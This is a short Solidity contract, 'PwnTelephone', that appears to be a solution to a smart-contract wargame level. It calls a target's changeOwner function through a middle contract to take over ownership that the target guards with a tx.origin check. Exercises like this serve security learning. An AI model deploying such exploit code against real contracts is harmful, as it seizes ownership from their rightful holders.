// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnTelephone {
    function pwn(address target) external {
        (bool success,) = target.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(success);
    }
}
